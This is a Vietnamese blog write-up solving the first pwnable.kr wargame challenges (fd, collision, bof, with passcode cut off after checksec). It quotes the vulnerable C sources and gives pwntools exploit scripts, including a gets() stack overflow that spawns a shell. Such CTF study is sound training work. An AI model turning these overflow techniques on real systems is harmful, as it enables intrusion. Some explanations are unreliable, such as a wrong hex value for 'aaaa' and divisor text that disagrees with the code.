<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>PWNABLE.KR - Phần 1 | vuk3r</title><meta name="author" content="vuk3r"><meta name="copyright" content="vuk3r"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="Đây là series try hard giải các challenge trên trang web pwnable.kr. Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :&gt; fdDescription123456Mommy! what i">
<meta property="og:type" content="article">
<meta property="og:title" content="PWNABLE.KR - Phần 1">
<meta property="og:url" content="https://vuk3r.github.io/2026/02/02/PWNABLE-KR-Phan-1/index.html">
<meta property="og:site_name" content="vuk3r">
<meta property="og:description" content="Đây là series try hard giải các challenge trên trang web pwnable.kr. Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :&gt; fdDescription123456Mommy! what i">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://vuk3r.github.io/img/post/writeup/pwnable-kr/thumbnail.png">
<meta property="article:published_time" content="2026-02-02T14:41:01.000Z">
<meta property="article:modified_time" content="2026-02-26T14:45:09.225Z">
<meta property="article:author" content="vuk3r">
<meta property="article:tag" content="PWN">
<meta property="article:tag" content="Writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://vuk3r.github.io/img/post/writeup/pwnable-kr/thumbnail.png"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "PWNABLE.KR - Phần 1",
  "url": "https://vuk3r.github.io/2026/02/02/PWNABLE-KR-Phan-1/",
  "image": "https://vuk3r.github.io/img/post/writeup/pwnable-kr/thumbnail.png",
  "datePublished": "2026-02-02T14:41:01.000Z",
  "dateModified": "2026-02-26T14:45:09.225Z",
  "author": [
    {
      "@type": "Person",
      "name": "vuk3r",
      "url": "https://vuk3r.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon/favicon.ico"><link rel="canonical" href="https://vuk3r.github.io/2026/02/02/PWNABLE-KR-Phan-1/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'PWNABLE.KR - Phần 1',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="vuk3r" type="application/atom+xml">
</head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/background/cyberpunk.png);"></div><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">vuk3r</span></a><a class="nav-page-title" href="/"><span class="site-name">PWNABLE.KR - Phần 1</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"></div></nav></header><main class="layout" id="content-inner"><div id="post"><div id="post-info"><h1 class="post-title">PWNABLE.KR - Phần 1</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2026-02-02T14:41:01.000Z" title="Created 2026-02-02 21:41:01">2026-02-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2026-02-26T14:45:09.225Z" title="Updated 2026-02-26 21:45:09">2026-02-26</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div><article class="container post-content" id="article-container"><p>Đây là series try hard giải các challenge trên trang web <a target="_blank" rel="noopener" href="http://pwnable.kr/">pwnable.kr</a>. Với mỗi chall mình sẽ phân tích hướng giải và những điều mình học được từ những challenge đó :&gt;</p>
<h1 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but <span class="keyword">if</span> you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:<span class="comment">//youtu.be/971eZhMHQQw</span></span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source"><a href="#Source" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> buf[<span class="number">32</span>];</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[], <span class="type">char</span>* envp[])</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pass argv[1] a number\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">int</span> fd = atoi( argv[<span class="number">1</span>] ) - <span class="number">0x1234</span>;</span><br><span class="line">	<span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">	len = read(fd, buf, <span class="number">32</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;LETMEWIN\n&quot;</span>, buf))&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;good job :)\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;learn about Linux file IO\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><p>Khi gọi hàm read, chương trình truyền vào tham số đầu tiên là <code>fd</code> với <code>fd</code> được tính theo công thức  <code>atoi( argv[1] ) - 0x1234</code> và argv[1] có nghĩa là tham số đầu tiên khi bạn gọi file ( ví dụ như <code>./fd 123</code>)</p>
<p>Và nếu như <code>read</code> thực thi thành công thì sẽ yêu cầu bạn nhập input và lưu vào biến <code>buf</code>, sau đó đem đi so sánh với chuỗi   <code>LETMEWIN\n</code> là đọc được flag.</p>
<p>tìm hiểu <code>fd</code> thì mình biết được rằng đó là chỉ số <code>file description</code>, với đầu vào là input từ bàn phím thì ta cần nó là <code>fd</code> của <code>STDIN</code> tương đương với <code>0</code>, <code>argv[1]</code> sẽ được <code>atoi()</code> chuyển về số nguyên và đem trừ với <code>0x1234</code> thì ta chỉ cần gọi file với tham số đầu là <code>4660</code> là được.</p>
<h2 id="Payload"><a href="#Payload" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">### USING : python3 solve.py fd</span><br><span class="line"></span><br><span class="line">p = ssh(</span><br><span class="line">    user=sys.argv[<span class="number">1</span>],</span><br><span class="line">    host=<span class="string">&#x27;pwnable.kr&#x27;</span>,</span><br><span class="line">    port=<span class="number">2222</span>,</span><br><span class="line">    password=<span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">)</span><br><span class="line">sh = p.shell()</span><br><span class="line"></span><br><span class="line">fd_minus = <span class="number">0x1234</span></span><br><span class="line">sh.sendline(f<span class="string">&#x27;./fd &#123;fd_minus&#125;&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">&#x27;LETMEWIN\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()  </span><br></pre></td></tr></table></figure>

<h1 id="Collision"><a href="#Collision" class="headerlink" title="Collision"></a>Collision</h1><h2 id="Description-1"><a href="#Description-1" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna <span class="keyword">do</span> something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-1"><a href="#Source-1" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">check_password</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* p)</span>&#123; </span><br><span class="line">        <span class="type">int</span>* ip = (<span class="type">int</span>*)p;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;usage : %s [passcode]\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;passcode length should be 20 bytes\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;wrong passcode.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution"></a>Solution</h2><p>Bài này yêu cầu đầu vào dài 20 byte. Sau đó làm gì đó với input của mình rồi mới đem so với biến <code>hashcode</code>. Hàm <code>check_password()</code> nhận vào 1 chuỗi dài 20 byte, sau đó gọi 1 con trỏ int để trỏ tới 4 kí tự 1 lần. </p>
<p>Ví dụ mình nhập <code>aaaabbbbccccddddeeee</code> thì con trỏ đầu tiên sẽ trỏ tới địa chỉ mang giá trị <code>0x4141414141</code> rồi cộng số đó vào biến <code>res</code>. Nôm na thì là chuỗi dài 20 kí tự, lấy hex của 4 kí tự đầu ra, cộng vào <code>res</code>, tới 4 kí  tự tiếp theo và làm hành động đó tổng là 5 lần. Vậy thì ta chỉ cần lấy biến <code>hashcode</code> chia ra làm 4 phần bằng nhau và cộng với phần còn lại, ghép 5 phần thành 1 chuỗi thì ta sẽ thu được 1 chuỗi khi đi qua hàm <code>check_password()</code> sẽ trả về giá trị bằng với <code>hashcode</code>. Mình không chia cho 5 vì khi lấy chuỗi <code>0x21DD09EC/5</code>thì mình thấy dư nên sẽ chia 4, vừa tròn đẹp :&gt;</p>
<h2 id="Payload-1"><a href="#Payload-1" class="headerlink" title="Payload"></a>Payload</h2><p>Để cho tiện thì mình in chuỗi đó ra rồi thêm trực tiếp vào chương trình bằng thủ công :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hashcode = <span class="number">0x21DD09EC</span></span><br><span class="line">chunk = <span class="type">int</span>(hashcode/<span class="number">5</span>)</span><br><span class="line">final_chunk = hashcode-chunk*<span class="number">4</span></span><br><span class="line">payload = p32(chunk)*<span class="number">4</span> + p32(final_chunk)</span><br><span class="line">print(repr(payload))</span><br><span class="line"></span><br><span class="line"><span class="meta"># output : b<span class="string">&#x27;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&#x27;</span></span></span><br><span class="line"><span class="meta"># usage  : ./col $<span class="string">&#x27;\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xc8\xce\xc5\x06\xcc\xce\xc5\x06&#x27;</span></span></span><br></pre></td></tr></table></figure>

<h1 id="Bof"><a href="#Bof" class="headerlink" title="Bof"></a>Bof</h1><h2 id="Description-2"><a href="#Description-2" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that <span class="literal">true</span>?</span><br><span class="line"></span><br><span class="line">ssh bof@pwnable.kr -p2222 (pw: guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-2"><a href="#Source-2" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> key)</span>&#123;</span><br><span class="line">	<span class="type">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;overflow me : &quot;</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">		system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Nah..\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Solution-2"><a href="#Solution-2" class="headerlink" title="Solution"></a>Solution</h2><p>Với biến <code>overflowme</code> được khai báo là 32 byte nhưng gọi tới hàm <code>gets()</code> - một hàm nhập không có điểm dừng :v Nên chỉ cần mình khi tràn xuống biến <code>key</code> ở dưới là được. Chương trình được cho là <code>x86</code> có nghĩa là tham số <code>key</code> sẽ nằm trên stack khi được khai báo và địa chỉ sẽ nằm cao hơn địa chỉ của biến local của hàm <code>func</code> ⇒ Biến <code>overflowme</code> có thể thay đổi giá trị của biến <code>key</code> khi ghi tràn.</p>
<h2 id="Payload-2"><a href="#Payload-2" class="headerlink" title="Payload"></a>Payload</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">### USING : python3 solve.py bof</span><br><span class="line"></span><br><span class="line">p = ssh(</span><br><span class="line">    user=sys.argv[<span class="number">1</span>],</span><br><span class="line">    host=<span class="string">&#x27;pwnable.kr&#x27;</span>,</span><br><span class="line">    port=<span class="number">2222</span>,</span><br><span class="line">    password=<span class="string">&#x27;guest&#x27;</span>,</span><br><span class="line">)</span><br><span class="line">sh = p.shell()</span><br><span class="line"></span><br><span class="line">sh.sendline(b<span class="string">&#x27;nc 0 9000&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">52</span></span><br><span class="line">payload += p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="meta">#cat flag</span></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="Passcode"><a href="#Passcode" class="headerlink" title="Passcode"></a>Passcode</h1><h2 id="Description-3"><a href="#Description-3" class="headerlink" title="Description"></a>Description</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Mommy told me to make a passcode based login system.</span><br><span class="line">My first trial C implementation compiled without any error!</span><br><span class="line">Well, there were some compiler warnings, but who cares about that?</span><br><span class="line"></span><br><span class="line">ssh passcode@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure>

<h2 id="Source-3"><a href="#Source-3" class="headerlink" title="Source"></a>Source</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">login</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">int</span> passcode1;</span><br><span class="line">	<span class="type">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">123456</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">		setregid(getegid(), getegid());</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">welcome</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.1 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Checksec"><a href="#Checksec" class="headerlink" title="Checksec"></a>Checksec</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386</span><br><span class="line">RELRO:      Partial RELRO</span><br><span class="line">Stack:      Canary found</span><br><span class="line">NX:         NX enabled</span><br><span class="line">PIE:        No <span class="title function_">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span><br><span class="line">Stripped:   No</span><br></pre></td></tr></table></figure>

